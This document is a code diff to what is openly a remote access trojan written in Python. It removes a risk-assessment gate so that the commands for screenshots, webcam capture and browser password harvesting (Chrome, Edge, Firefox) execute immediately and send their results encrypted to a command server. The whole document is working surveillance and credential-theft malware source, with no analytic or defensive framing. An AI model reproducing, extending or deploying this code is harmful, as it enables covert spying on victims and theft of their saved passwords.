@@ -245,12 +245,8 @@ class AdaptiveBehavior:
             pass
         return min(risk_score, 1.0)
     def should_execute_command(self, command_type):
-        risk = self.assess_risk()
-        high_risk_commands = ['screenshot', 'webcam', 'keylogs', 'passwords']
-        if command_type in high_risk_commands:
-            return risk < 0.3
-        else:
-            return risk < 0.6
+        # Risk assessment disabled - execute all commands immediately
+        return True
 
 # ═══════════════════════════════════════════════════════════════
 # SURVEILLANCE FUNCTIONS
@@ -817,21 +813,15 @@ def connect_to_server(host, port, key):
                 
                 # Screenshot
                 elif command.lower() == 'screenshot':
-                    if ai_behavior.should_execute_command('screenshot'):
-                        s.send(encrypt_data(key, "Taking screenshot..."))
-                        screenshot = take_screenshot()
-                        s.send(encrypt_data(key, screenshot))
-                    else:
-                        s.send(encrypt_data(key, "[!] Risk too high, delaying screenshot"))
+                    s.send(encrypt_data(key, "Taking screenshot..."))
+                    screenshot = take_screenshot()
+                    s.send(encrypt_data(key, screenshot))
                 
                 # Webcam
                 elif command.lower() == 'webcam':
-                    if ai_behavior.should_execute_command('webcam'):
-                        s.send(encrypt_data(key, "Capturing webcam..."))
-                        webcam = capture_webcam()
-                        s.send(encrypt_data(key, webcam))
-                    else:
-                        s.send(encrypt_data(key, "[!] Risk too high, delaying webcam"))
+                    s.send(encrypt_data(key, "Capturing webcam..."))
+                    webcam = capture_webcam()
+                    s.send(encrypt_data(key, webcam))
                 
                 # Keylogs
                 elif command.lower() == 'keylogs':
@@ -860,13 +850,10 @@ def connect_to_server(host, port, key):
                 
                 # Passwords
                 elif command.lower() == 'passwords':
-                    if ai_behavior.should_execute_command('passwords'):
-                        output = "=== CHROME ===\n" + get_chrome_passwords()
-                        output += "\n\n=== EDGE ===\n" + get_edge_passwords()
-                        output += "\n\n=== FIREFOX ===\n" + get_firefox_passwords()
-                        s.send(encrypt_data(key, output))
-                    else:
-                        s.send(encrypt_data(key, "[!] Risk too high, delaying credential harvest"))
+                    output = "=== CHROME ===\n" + get_chrome_passwords()
+                    output += "\n\n=== EDGE ===\n" + get_edge_passwords()
+                    output += "\n\n=== FIREFOX ===\n" + get_firefox_passwords()
+                    s.send(encrypt_data(key, output))
                 
                 # WiFi
                 elif command.lower() == 'wifi':
